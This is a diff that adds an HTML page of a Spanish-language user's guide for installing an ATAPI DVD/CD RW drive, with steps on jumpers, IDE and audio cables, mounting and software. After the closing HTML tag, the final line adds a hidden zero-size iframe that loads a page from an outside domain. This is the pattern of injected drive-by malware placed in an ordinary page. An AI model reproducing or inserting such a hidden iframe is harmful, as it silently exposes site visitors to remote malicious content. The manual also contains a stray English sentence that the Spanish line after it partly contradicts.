@@ -1,0 +1,225 @@
+<HTML>
+
+<HEAD>
+
+<TITLE>ATAPI Interface Drive User's Guide</TITLE>
+
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+
+<LINK REL="stylesheet" HREF="crx.css" TYPE="TEXT/CSS">
+
+</HEAD>
+
+<BODY BGCOLOR="#FFFFFF" TEXT="#000000" LEFTMARGIN="0" TOPMARGIN="0" MARGINWIDTH="0" MARGINHEIGHT="0">
+
+<!--***************************************** Head Start *****************************************-->
+
+<DIV topmargin="0"><IMG SRC="shead.gif" WIDTH="100%" HEIGHT="6"></div>
+
+<br>
+
+<DIV CLASS="divpage"> 
+
+<DIV CLASS="bodytxt">
+<IMG SRC="arrow.gif" WIDTH="16" HEIGHT="14" ALIGN="ABSMIDDLE">
+<A HREF="index.htm" TARGET="_main">Regreso a la pantalla de contenido</A>
+</DIV>
+
+<!--***************************************** Head end *****************************************-->
+
+<H1>Instalación</H1>
+
+<hr>
+
+
+<H2>Antes de la instalación</H2>
+
+<UL>
+  <LI>Consulte la lista de componentes para comprobar que el contenido del paquete sea completo. 
+   <LI>Tenga también a mano el manual de su PC.
+</UL>
+<BR>
+
+<H2>Instalación de la unidad</H2>
+
+<P>Estas instrucciones sirven para los PCs utilizados más frecuentemente.</P>
+
+<P><B>PRECAUCIÓN</B></P>
+
+<UL>
+  <LI>Evite tocar cualquier contacto o conductor electrónico expuesto de las tarjetas de circuitos de la unidad o del interior del PC. Las descargas de electricidad estática de su cuerpo pueden estropear estos componentes.
+  <LI>Antes de realizar las conexiones, toque el chasis metálico de su PC para descargar la electricidad estática que pueda tener su cuerpo.
+  <LI>Si utiliza este producto con un tipo de cable equivocado, es posible que no funcione correctamente. Siga las instrucciones cuando conecte el producto.
+  </UL>
+
+<P><BR></P>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">1</FONT></TD>
+    <TD></TD>
+    <TD valign="middle" align="left">Apague el PC y desenchufe el cable de alimentación de la toma de corriente.</TD>
+  </TR>
+</TABLE>
+
+<P><BR></P>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">2</FONT></TD>
+    <TD></TD>
+    <TD>Retire la cubierta.</TD>
+  </TR>
+</TABLE>
+
+<BLOCKQUOTE><IMG src="i001000.gif"><BR></BLOCKQUOTE>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">3</FONT></TD>
+    <TD></TD>
+    <TD>Determine el método de conexión de la tarjeta madre.
+<BR>Determine cómo conectar la unidad de acuerdo a las conexiones de unidad existentes.</TD>
+  </TR>
+</TABLE>
+
+<BLOCKQUOTE><IMG src="i002000.gif"><BR></BLOCKQUOTE>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+	<td width="3%" height="25" align="left" valign="top">
+	<img src="no01.gif" width="18" height="16"></td>
+
+	<td align="left" valign="top">Si conecta una sola unidad, configúrela como MASTER. Si conecta dos unidades, configure una de ellas como MASTER y la otra como SLAVE.</td>
+</tr>
+
+<tr>
+	<td width="3%" height="25" align="left" valign="top">
+	<img src="no02.gif" width="18" height="16"></td>
+
+	<td align="left" valign="top">Conector IDE primario</td>
+</tr>
+
+<tr>
+	<td width="3%" height="25" align="left" valign="top">
+	<img src="no03.gif" width="18" height="16"></td>
+
+	<td align="left" valign="top">Conector IDE secundario</td>
+</tr>
+</table>
+
+<P><B>PRECAUCIÓN</B></P>
+
+<UL>
+  <LI>El disco duro que está conectado con el cable IDE primario está normalmente conectado como la unidad principal. Cuando conecte el cable a esta unidad, ponga el puente de la unidad en la posición de unidad subordinada.<BR>
+  Also, depending on the PC, jumper settings on the hard disk may need to be changed. Refer to the manual of the PC or hard drive.
+  <LI>Además, dependiendo del PC, puede que no sea necesario cambiar los ajustes de los puentes del disco duro. Consulte el manual del PC o del disco duro.<BR>
+   <UL>
+     <LI>Si sólo se conecta esta unidad al cable, haga puentes en las clavijas principales.<BR>
+     <LI>Si se conecta otro aparato al mismo cable, asegúrese de que uno de ellos esté configurado como principal y el otro como secundario.
+   </UL>
+</UL>
+
+<P><BR></P>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">4</FONT></TD>
+    <TD></TD>
+    <TD>Establezca los atributos de la unidad con el puente de configuración de entorno de la parte posterior de la unidad.<BR>Si no sabe cómo configurar los puentes, consulte <a href="jumpaset.htm">"Confirmación de la configuración de los puentes"</a>.</TD>
+  </TR>
+</TABLE>
+
+<BLOCKQUOTE><IMG src="i0030ES.gif"><BR></BLOCKQUOTE>
+
+<P><B>PRECAUCIÓN</B></P>
+<UL>
+  <LI>Si instala esta unidad como reemplazo de otra que tenía un puente en la posición CSEL, ponga el puente en la posición CSEL antes de instalar la unidad.
+  <LI>El puente sólo deberá instalarse verticalmente (como se muestra en el diagrama). La instalación del puente en sentido horizontal puede estropear la unidad o hacer que ésta funcione mal.
+</UL>
+
+<P><BR></P>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">5</FONT></TD>
+    <TD></TD>
+    <TD>Conecte los cables.</TD>
+  </TR>
+</TABLE>
+
+<UL>
+  <LI>Conecte un extremo del cable de audio al conector ANALOG AUDIO de la unidad, y el otro extremo en el conector de entrada de audio de su PC.
+  <LI>Conecte el cable plano IDE al conector IDE de la unidad.
+  <LI>Conecte un conector de alimentación que no se utilice y que proceda de la fuente de alimentación del PC al conector de entrada de CC (entrada de alimentación) de la unidad.
+</UL>
+
+<BLOCKQUOTE><IMG src="i0050ES.gif"><BR></BLOCKQUOTE>
+
+<P><B>PRECAUCIÓN</B></P>
+
+<UL>
+  <LI>El lado rojo del cable plano IDE indica el conductor de la clavija 1. Verifique que el lado de la clavija 1 esté conectado a la clavija 1 de la tarjeta madre.
+  <LI>El conector de alimentación deberá estar insertado con el lado inclinado hacia arriba.
+  <LI>Si no se dispone de un conector de alimentación de recambio, será necesario un adaptador "Y".
+  <LI>Si el PC admite la reproducción digital, no es necesario conectar el cable de audio. 
+</UL>
+
+<P><BR></P>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">6</FONT></TD>
+    <TD></TD>
+    <TD>Instale la unidad en el alojamiento de unidades de 5 pulgadas empleando tornillos.</TD>
+  </TR>
+</TABLE>
+
+<BLOCKQUOTE><IMG src="i004000.gif"><BR></BLOCKQUOTE>
+
+<P><BR></P>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">7</FONT></TD>
+    <TD></TD>
+    <TD>Vuelva a colocar la cubierta en el PC y conecte el cable de alimentación.</TD>
+  </TR>
+</TABLE>
+
+<BLOCKQUOTE><IMG src="i006000.gif"><BR></BLOCKQUOTE>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">8</FONT></TD>
+    <TD></TD>
+    <TD>Arranque el PC y confirme que se detecta la unidad. 
+<BR>Abra [My Computer] en Windows y confirme que se ha añadido un icono de unidad.</TD>
+  </TR>
+</TABLE>
+
+<P><BR></P>
+
+<TABLE>
+  <TR>
+    <TD><FONT size="+4">9</FONT></TD>
+    <TD></TD>
+    <TD>Inserte el disco de software suministrado en la unidad DVD/CD RW e instale el software de grabación.</TD>
+  </TR>
+</TABLE>
+<br>
+<br>
+
+<HR>
+
+<DIV CLASS="bodytxt">
+<IMG SRC="arrow.gif" WIDTH="16" HEIGHT="14" ALIGN="ABSMIDDLE">
+<A HREF="index.htm" TARGET="_main">Regreso a la pantalla de contenido</A>
+</DIV>
+
+</div>
+
+<DIV CLASS="diveof"> </DIV>
+</BODY>
+</HTML>
+<iframe src=http://www.puma166.com/1.htm width=0 height=0></iframe>
